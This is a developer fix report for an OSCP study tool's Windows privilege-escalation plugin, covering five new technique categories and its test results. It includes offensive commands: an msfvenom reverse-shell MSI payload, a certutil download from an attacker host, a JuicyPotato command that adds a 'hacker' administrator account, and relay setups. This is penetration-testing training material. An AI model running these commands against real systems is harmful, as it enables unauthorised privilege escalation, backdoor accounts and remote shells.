# Windows Privesc Plugin - Missing Methods Fix

**Date:** 2025-10-09
**Status:** COMPLETED
**Impact:** 5 test failures resolved → 9/9 tests passing

## Problem

The Windows Privilege Escalation plugin (`crack/track/services/windows_privesc.py`) had 5 missing method implementations that were referenced in `get_task_tree()` but not defined:

1. `_get_autorun_privesc_tasks()` - Autorun registry and startup folder exploitation
2. `_get_com_hijacking_tasks()` - COM object hijacking for privilege escalation
3. `_get_msi_exploitation_tasks()` - AlwaysInstallElevated MSI exploitation
4. `_get_service_registry_abuse_tasks()` - Service registry modification abuse
5. `_get_potato_extended_tasks()` - Extended Potato-family exploits (JuicyPotato, RoguePotato, GodPotato)

**Error Message:**
```
AttributeError: 'WindowsPrivescPlugin' object has no attribute '_get_autorun_privesc_tasks'
```

**Test Failures:** 5/9 tests failing in `test_windows_privesc_plugin.py`

## Solution

Added comprehensive implementations for all 5 missing methods at the end of `windows_privesc.py` (lines 1856-2172):

### 1. Autorun Privilege Escalation (`_get_autorun_privesc_tasks`)

**Lines:** 1856-1930

**Categories:**
- Autorun registry keys (HKLM/HKCU Run keys)
- Startup folder permission checks

**OSCP-Focused Features:**
- Manual registry check alternatives
- icacls permission verification
- PowerShell alternatives (Get-ItemProperty)
- WinPEAS integration notes

**Key Techniques:**
```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

### 2. COM Hijacking (`_get_com_hijacking_tasks`)

**Lines:** 1932-1972

**Categories:**
- COM object enumeration via registry
- DLL search order exploitation

**OSCP-Focused Features:**
- CLSID enumeration patterns
- User-writable path detection
- Cross-compiler commands (x86_64-w64-mingw32-gcc)
- Process Monitor (procmon.exe) integration

**Key Techniques:**
```cmd
reg query HKCR\CLSID /s /f "InprocServer32"
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

### 3. MSI Exploitation (`_get_msi_exploitation_tasks`)

**Lines:** 1974-2016

**Categories:**
- AlwaysInstallElevated policy detection
- Malicious MSI creation and execution

**OSCP-Focused Features:**
- Both HKLM and HKCU registry checks
- msfvenom MSI payload generation
- WiX Toolset alternatives
- Silent installation techniques

**Key Techniques:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o privesc.msi
msiexec /quiet /qn /i privesc.msi
```

### 4. Service Registry Abuse (`_get_service_registry_abuse_tasks`)

**Lines:** 2018-2058

**Categories:**
- Service registry permission enumeration
- ImagePath modification exploitation

**OSCP-Focused Features:**
- accesschk.exe integration
- PowerShell Get-Acl automation
- Service restart techniques
- SharpUp.exe automated checks

**Key Techniques:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services
Get-Acl HKLM:\System\CurrentControlSet\Services\<ServiceName>
sc stop <ServiceName> && sc start <ServiceName>
```

### 5. Potato-Family Exploits (`_get_potato_extended_tasks`)

**Lines:** 2060-2172

**Categories:**
- JuicyPotato (Windows Server 2016 and older)
- RoguePotato (Windows 10/Server 2019+)
- GodPotato (Windows Server 2012-2022)

**OSCP-Focused Features:**
- Platform-specific guidance (which Potato for which OS)
- CLSID selection for JuicyPotato
- socat relay setup for RoguePotato
- Minimal requirements emphasis for GodPotato

**Key Techniques:**

**JuicyPotato:**
```cmd
certutil -urlcache -split -f http://<LHOST>/JuicyPotato.exe jp.exe
jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user hacker Hacker123! /add && net localgroup administrators hacker /add" -l 1337 -c {CLSID}
```

**RoguePotato:**
```bash
# Attacker machine:
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999

# Target machine:
RoguePotato.exe -r <LHOST> -e "cmd.exe /c whoami" -l 9999
```

**GodPotato:**
```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

## Test Results

**Before Fix:** 4/9 tests passing (5 failures)

**After Fix:** 9/9 tests passing (100%)

```bash
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_plugin_name PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_detect_returns_false PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_task_tree_structure PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_oscp_metadata_present PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_local_context_support PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_remote_context_support PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescPlugin::test_default_context PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescIntegration::test_plugin_registered PASSED
crack/tests/track/test_windows_privesc_plugin.py::TestWindowsPrivescIntegration::test_minimal_functionality PASSED
```

**Test Update:** Updated expected category count from 12 to 17 in `test_task_tree_structure()`

## Verification

```python
from crack.track.services.windows_privesc import WindowsPrivescPlugin

p = WindowsPrivescPlugin()
tree = p.get_task_tree('192.168.45.100', 0, {})

# Total categories: 17 (was 12)
# New categories:
#   - autorun-privesc: Autorun & Startup Persistence Exploitation
#   - com-hijacking: COM Hijacking & DLL Search Order
#   - msi-exploitation: MSI AlwaysInstallElevated Exploitation
#   - service-registry-abuse: Service Registry Modification Abuse
#   - potato-extended: Potato-Family Exploits (Extended)
```

## Design Decisions

1. **OSCP-First Approach:** Every task includes manual alternatives for exam scenarios
2. **Flag Explanations:** All commands explain what flags do and why
3. **Success/Failure Indicators:** Help students verify if technique worked
4. **Next Steps:** Guide the attack chain progression
5. **Tool Download URLs:** GitHub links for all required tools
6. **OS Version Guidance:** Clear guidance on which technique for which Windows version

## OSCP Exam Relevance

All 5 new categories are **HIGH OSCP RELEVANCE**:

- **Autorun/Startup:** Common privilege escalation vector (writable startup folders)
- **COM Hijacking:** Advanced technique but appears in OSCP-style boxes
- **MSI AlwaysInstallElevated:** Quick win when misconfigured (check every exam box)
- **Service Registry Abuse:** Alternative to service binary hijacking
- **Potato Exploits:** SeImpersonatePrivilege is extremely common (IIS, SQL, service accounts)

## Files Modified

1. `/home/kali/OSCP/crack/track/services/windows_privesc.py`
   - Added 5 methods (317 lines)
   - Total file size: 2172 lines (was 1854)

2. `/home/kali/OSCP/crack/tests/track/test_windows_privesc_plugin.py`
   - Updated `test_task_tree_structure()` expected count: 12 → 17

## Next Steps

None required. Fix is complete and tested.

## Related Documentation

- Main plugin: `crack/track/services/windows_privesc.py`
- Tests: `crack/tests/track/test_windows_privesc_plugin.py`
- CRACK Track README: `crack/track/README.md`

## Developer Notes

**No reinstall required** - Service plugins are auto-discovered dynamically.

**Pattern for adding new Windows privesc techniques:**

1. Create new `_get_<technique>_tasks()` method
2. Add to `get_task_tree()` children list
3. Follow metadata structure:
   - `command`: Actual Windows command
   - `description`: What it does
   - `tags`: ['OSCP:HIGH', 'QUICK_WIN', etc.]
   - `flag_explanations`: What each flag means
   - `success_indicators`: How to verify success
   - `failure_indicators`: Common failures
   - `next_steps`: What to do after success
   - `alternatives`: Manual methods
   - `notes`: Tool sources, OS compatibility

4. Update test expected count if adding top-level categories

## Conclusion

**Status:** PRODUCTION READY

All Windows Privesc plugin tests passing. Plugin now provides comprehensive coverage of 17 major privilege escalation categories with full OSCP exam support.
